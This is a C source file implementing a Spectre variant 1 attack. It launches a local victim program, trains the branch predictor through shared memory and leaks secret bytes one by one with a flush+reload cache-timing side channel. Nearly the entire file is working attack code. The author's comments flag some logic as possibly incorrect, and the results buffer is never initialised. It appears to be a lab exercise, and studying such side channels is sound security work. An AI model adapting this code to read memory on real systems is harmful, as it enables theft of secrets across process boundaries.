#define _GNU_SOURCE

#include <time.h> 
#include <fcntl.h> 
#include <sys/types.h>
#include <unistd.h> 
#include <sys/mman.h> 
#include <stdlib.h>
#include <stdint.h>
#include <x86intrin.h>
#include <stdio.h>        // For printf
#include <stdbool.h>      // For bool type
#include <sched.h>        // For sched_yield, sched_setaffinity
#include <signal.h>       // For kill()
#include <sys/wait.h>     // For process management 

#define CACHE_HIT_THRESHOLD 120
#define CACHE_LINE_SIZE 0x1000
#define BUFF_SIZE 255


char * shared_buffer;

// just flushing everything we are interested in, in the cache
void pre_work() {
	uint8_t *addr;
	for (int j = 0; j < BUFF_SIZE; j++) {
		addr = shared_buffer + j * CACHE_LINE_SIZE;
		_mm_clflush(addr);
	}

}

uint64_t time_access_no_flush(void *p) {
	uint64_t start, end;
	_mm_mfence();
	start = __rdtsc();
	volatile uint64_t x = *(volatile uint64_t*)p;
	_mm_mfence();
	end = __rdtsc();
	return end - start;
}

bool post_work_inner_work (int mix_i) {
	uint8_t *addr;
	size_t cache_hit_threshold = CACHE_HIT_THRESHOLD;
	
	// below MIGHT NOT BE CORRECT
	int offset;
	uint64_t t_no_flush;
	offset = mix_i * CACHE_LINE_SIZE;
	addr = shared_buffer + offset;
	t_no_flush = time_access_no_flush(addr);
	if (mix_i != 0 && mix_i != 255 && t_no_flush <= cache_hit_threshold) {
		printf("cache hit! %d timing: %ld\n", mix_i, t_no_flush);
		return true;
	}
	return false;
}

void post_work(int *stats) {
	for (size_t i = 0x20; i < 255; i++) {
		int mix_i = ((i * 167) + 13) & 255;    
		if (post_work_inner_work(mix_i)) {
			stats[mix_i]++;
		}
	}
}

bool unsolved(int *results, int len) {
    for (int i = 0; i < len; i++) {
        if (results[i] == 0) {
            return true;  // Still have unsolved characters
        }
    }
    return false;  // All characters found
}

void *attach_to_shared_mem() {
	int ret;
	int fd = shm_open("/shm_f", O_RDWR | O_CREAT, S_IRWXU | S_IRWXG | S_IRWXO);
	ret = ftruncate(fd, 0x1000 * 255);
	char *ptr = mmap(0, 255* 0x1000, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE, fd, 0);
	close(fd);
	return ptr;
}

pid_t start_target() {
	char* new_argv[] = {"./spectre_victim", NULL};
	pid_t pid = fork();
	 if (!pid) {
	 	execv(new_argv[0], new_argv);
	 	exit(0); // should never be reached
	 }
	return pid;
}


void train_target() {

	for (int i = 0; i < 1000; i++) {
		int mix_i = ((i * 167) + 13) & 255;
		// repeatedly allowing the victim code to loop with valid indexes
		((volatile int *) shared_buffer)[1] = mix_i % 128;
		((volatile int*) shared_buffer)[0] = 1;
		sched_yield();
	}
	// temporary pause
	for (int i = 0; i < 400; i++) {
		((volatile int *) shared_buffer)[1] = 0;
		// set the run index to be 0, off 
		// a small pause here to know that the training is done
		((volatile int*) shared_buffer)[0] = 0;
		sched_yield();
	}
}

void speculate(int pos) {
	// constantly accessing a position that we can interested in
	// which is an invalid position
	
	for (int i = 0; i < 300; i++) {
		((volatile int*) shared_buffer)[1] = 128 + pos;
		
		// set the run value to true
		((volatile int*) shared_buffer)[0] = 1;
		
		// release executing to allow victim process to access it
		sched_yield();
	}
}



void calibrate_cache_timing() {
    uint8_t *test_addr = shared_buffer;
    uint64_t time1, time2;
    
    // Test cache miss
    _mm_clflush(test_addr);
    time1 = time_access_no_flush(test_addr);
    printf("Cache miss time: %lu cycles\n", time1);
    
    // Test cache hit
    volatile uint8_t x = *test_addr;  // Load into cache
    time2 = time_access_no_flush(test_addr);
    printf("Cache hit time: %lu cycles\n", time2);
    
    printf("Suggested threshold: %lu\n", (time1 + time2) / 2);
}


void exploit(int len) {
	int *results = malloc(sizeof(int) * len + 1);
	int max_index = 0;
	int max_val = 0;
	int stats[256] = {0};
	
	// while we have unsolved results
	// we are going to perform a loop 
	while(unsolved(results, len)) {
		
		for (int i = 0; i < len ; i++) {
			// if the result is known
			if (results[i] != '\x00')
				continue;
			
			// clear stats array
			for (int j = 0; j < 255; j++) 
				stats[j] = 0;
				
			// if all values known, break
			
			if (!unsolved(results, len)) {
				break;
			}
			
			
			// work loop 
			for (int j = 0; j < 1000; j++) {

				pre_work(); // flushing the cache
				

				
				train_target(); 
				usleep(100);
				// we have interacted with the cache during training 
				// so we need to flush it again because measuring
				pre_work(); 
				
				// exploit target (once i believe I have the victim process primed up)
				speculate(i);
				usleep(100);
				// post work to sum up how many entries find 
				// and infer the secret value
				post_work(stats);
				//stats value now loaded with information
			}
			
			// reviewing the stats data and printing out
			// the likely character
			max_val = 0;
			max_index = 0;
			for (int j = 0x20; j < 128; j++) {
				if (stats[j] > max_val) {
					max_index = j;
					max_val = stats[j];
				}
			}
			
			// saving result 
			if ( max_index != 0 && max_val > 1) {
				results[i] = max_index;
				// show current status
				printf("attempted index %d found %d = %c with %d hits\n", i, max_index, max_index, stats[max_index]);
			}
			
			printf("Current results\n");
			for (int j = 0; j < len; j++) {
				printf("index: %d value: %c\n", j, results[j]);
			}
		}
	}
}

//  Locks exploit to a specific hw core 
// So that it would interact with the same branch predictor with the victim process
void set_affinity() {

	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(2, &set);
	sched_setaffinity(0, sizeof(set), &set);
}

int main (int argc, char** argv) {
	pid_t pid;
	
	// pin CPU to a specific core so that it interact with the same branch predictor with victim code
	set_affinity();
	
	// create shared memory and set command values to 0
	
	shared_buffer = (char *) attach_to_shared_mem();
	
	// set them to be in a known state
	((int *) shared_buffer)[0] = 0;
	((int *) shared_buffer)[1] = 0;
	((int *) shared_buffer)[2] = 0;
	
	// start the victim process
	pid = start_target();
	
	// micro sleep. 
	// states that the CPU is free to process other work
	// allows other work to schedule to CPU
	// so that the victim process can run
	sched_yield();
	
	//calibrate_cache_timing();
	
	exploit(5);
	kill(pid, 9);
	return 0;
}






